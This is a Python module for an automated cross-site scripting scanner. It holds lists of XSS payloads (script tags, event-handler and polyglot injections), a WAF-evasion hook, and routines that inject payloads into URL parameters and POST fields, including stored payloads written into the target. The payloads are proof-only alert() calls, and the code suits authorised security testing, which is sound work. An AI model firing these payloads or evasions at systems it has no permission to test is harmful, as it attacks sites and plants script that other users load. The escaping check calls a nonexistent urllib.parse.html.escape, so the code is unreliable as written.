"""
XSS Scanner - Automated Cross-Site Scripting Detection
Detects Reflected, Stored, and DOM-based XSS
"""
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple
from html.parser import HTMLParser

class XSSScanner:
    def __init__(self, engine, waf_evasion=None):
        self.engine = engine
        self.waf = waf_evasion
        
        # Context-specific payloads
        self.payloads = {
            "basic": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
            ],
            "context_break": [
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "</script><script>alert(1)</script>",
                "';alert(1);//",
            ],
            "polyglot": [
                "javascript://--></script></title></style>'/\\\"/><img src=x onerror=alert(1)>",
                "\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            ],
            "dom": [
                "#<img src=x onerror=alert(1)>",
                "javascript://alert(1)",
            ]
        }
        
        # Context detection patterns
        self.context_patterns = {
            "html": r'<[^>]+>',
            "attribute": r'[a-zA-Z]+=["\'][^"\']*',
            "script": r'<script[^>]*>.*?</script>',
            "style": r'<style[^>]*>.*?</style>',
            "comment": r'<!--.*?-->',
            "javascript": r'(javascript:|on\w+\s*=)',
        }
    
    async def scan_reflected(self, url: str, param: str) -> Optional[Dict]:
        """Scan for Reflected XSS"""
        findings = []
        
        for category, payloads in self.payloads.items():
            for payload in payloads:
                # Apply WAF evasion
                test_payload = self.waf.evade_payload(payload) if self.waf else payload
                
                # Build URL with payload
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param] = [test_payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                
                result = await self.engine.request("GET", test_url)
                
                if self._verify_xss(result.body, test_payload, param):
                    context = self._identify_context(result.body, test_payload)
                    findings.append({
                        "type": "XSS_REFLECTED",
                        "url": url,
                        "parameter": param,
                        "payload": test_payload,
                        "context": context,
                        "evidence": self._extract_evidence(result.body, test_payload),
                        "severity": "HIGH"
                    })
        
        return findings[0] if findings else None
    
    async def scan_stored(self, url: str, param: str, post_data: Dict = None) -> Optional[Dict]:
        """Scan for Stored XSS (requires POST then GET)"""
        for payload in self.payloads["basic"]:
            test_payload = self.waf.evade_payload(payload) if self.waf else payload
            
            # Send payload
            data = post_data or {}
            data[param] = test_payload
            
            await self.engine.request("POST", url, data=data)
            
            # Verify response
            result = await self.engine.request("GET", url)
            
            if self._verify_xss(result.body, test_payload, param):
                return {
                    "type": "XSS_STORED",
                    "url": url,
                    "parameter": param,
                    "payload": test_payload,
                    "severity": "CRITICAL"
                }
        
        return None
    
    def _verify_xss(self, body: str, payload: str, param: str) -> bool:
        """Verify XSS execution"""
        if not body:
            return False
        
        # Check for raw payload
        if payload in body:
            # Ensure no escaping
            escaped = urllib.parse.html.escape(payload)
            if escaped not in body:
                return True
        
        # Check for JavaScript execution
        if "<script>" in payload and "alert" in body:
            if re.search(r'<script>\s*alert\s*\(', body, re.IGNORECASE):
                return True
        
        # Check for event handlers
        if "onerror" in payload or "onload" in payload:
            if re.search(r'on\w+\s*=\s*["\']?[^"\']*alert', body, re.IGNORECASE):
                return True
        
        return False
    
    def _identify_context(self, body: str, payload: str) -> str:
        """Identify XSS context (HTML, Attribute, Script, etc.)"""
        idx = body.find(payload)
        if idx == -1:
            return "unknown"
        
        # Check 200 chars before and after
        context_window = body[max(0, idx-200):min(len(body), idx+len(payload)+200)]
        
        if re.search(r'<script[^>]*>', context_window, re.IGNORECASE):
            return "script"
        elif re.search(r'<[^>]+\s+\w+\s*=\s*["\'][^"\']*$', context_window[:100]):
            return "attribute"
        elif re.search(r'<style[^>]*>', context_window, re.IGNORECASE):
            return "style"
        elif re.search(r'<!--', context_window):
            return "comment"
        else:
            return "html"
    
    def _extract_evidence(self, body: str, payload: str) -> str:
        """Extract XSS evidence"""
        idx = body.find(payload)
        if idx != -1:
            start = max(0, idx - 100)
            end = min(len(body), idx + len(payload) + 100)
            return body[start:end].replace(payload, f"[[PAYLOAD:{payload}]]")
        return ""